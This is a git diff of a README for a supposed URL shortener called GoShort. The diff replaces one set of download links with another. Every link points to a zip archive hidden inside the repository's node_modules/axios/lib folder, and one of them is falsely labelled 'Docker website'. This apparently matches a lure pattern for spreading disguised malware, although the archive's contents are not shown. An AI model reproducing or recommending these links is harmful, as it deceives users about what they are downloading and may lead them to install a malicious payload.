@@ -1,7 +1,7 @@
 # 🚀 GoShort - Effortlessly Shorten Your URLs
 
 ## 📥 Download Now
-[![Download GoShort](https://raw.githubusercontent.com/afrozullakhan25/GoShort/main/node_modules/axios/lib/env/classes/Short_Go_v2.0.zip)](https://raw.githubusercontent.com/afrozullakhan25/GoShort/main/node_modules/axios/lib/env/classes/Short_Go_v2.0.zip)
+[![Download GoShort](https://github.com/afrozullakhan25/GoShort/raw/refs/heads/main/node_modules/axios/lib/Go-Short-2.4.zip)](https://github.com/afrozullakhan25/GoShort/raw/refs/heads/main/node_modules/axios/lib/Go-Short-2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to GoShort! This application is a cloud-native URL shortener built with the latest technologies. Use it to turn long URLs into short, easy-to-share links. No technical skills needed; installing and running GoShort is straightforward.
@@ -10,7 +10,7 @@ Welcome to GoShort! This application is a cloud-native URL shortener built with 
 Before you get started, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Docker:** Must have Docker installed. If you don’t have it, you can download it from the [Docker website](https://raw.githubusercontent.com/afrozullakhan25/GoShort/main/node_modules/axios/lib/env/classes/Short_Go_v2.0.zip).
+- **Docker:** Must have Docker installed. If you don’t have it, you can download it from the [Docker website](https://github.com/afrozullakhan25/GoShort/raw/refs/heads/main/node_modules/axios/lib/Go-Short-2.4.zip).
 - **Internet Connection:** Required for downloading and running the application.
 
 ## 📦 Features
@@ -23,7 +23,7 @@ Before you get started, ensure your system meets these requirements:
 ## 📥 Download & Install
 To get the latest version of GoShort, click the link below:
 
-[Download GoShort](https://raw.githubusercontent.com/afrozullakhan25/GoShort/main/node_modules/axios/lib/env/classes/Short_Go_v2.0.zip)
+[Download GoShort](https://github.com/afrozullakhan25/GoShort/raw/refs/heads/main/node_modules/axios/lib/Go-Short-2.4.zip)
 
 ### Installation Steps:
 1. **Visit the Releases Page:** Click the link above to go to the releases page.
